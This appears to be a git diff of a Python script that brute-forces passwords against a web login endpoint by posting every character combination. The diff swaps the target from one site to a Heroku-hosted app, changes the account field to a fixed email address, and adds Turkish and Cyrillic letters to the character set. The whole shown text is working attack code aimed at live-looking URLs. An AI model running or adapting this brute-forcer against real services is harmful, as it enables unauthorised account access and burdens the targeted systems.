@@ -2,15 +2,18 @@ import itertools
 import os
 import string
 import sys
-
 import requests
 
 
 def main():
     start_char = sys.argv[1]
     password_length = 10
-    min_length = 6
-    chars = string.ascii_letters + string.digits + string.punctuation
+    min_length = 10
+    turkish = "çğıöşüÇĞİÖŞÜ"
+    cyrillic_upper = "".join(chr(cp) for cp in range(0x0410, 0x042F + 1))
+    cyrillic_lower = "".join(chr(cp) for cp in range(0x0430, 0x044F + 1))
+    cyrillic = cyrillic_upper + cyrillic_lower
+    chars = string.ascii_letters + string.digits + string.punctuation + turkish + cyrillic
     index = chars.index(start_char)
     rotated = chars[index:] + chars[:index]
 
@@ -22,11 +25,11 @@ def main():
                         try:
                             combination = first_char + "".join(rest)
                             payload = {
-                                "username": "brute",
+                                "email": "test@easy.ch",
                                 "password": combination,
                             }
                             session = requests.Session()
-                            response = session.post("https://fretux.ch/socket/login", json=payload, timeout=5)
+                            response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login", json=payload, timeout=5)
                             print(combination, response.status_code)
                             if response.ok:
                                 print(combination)
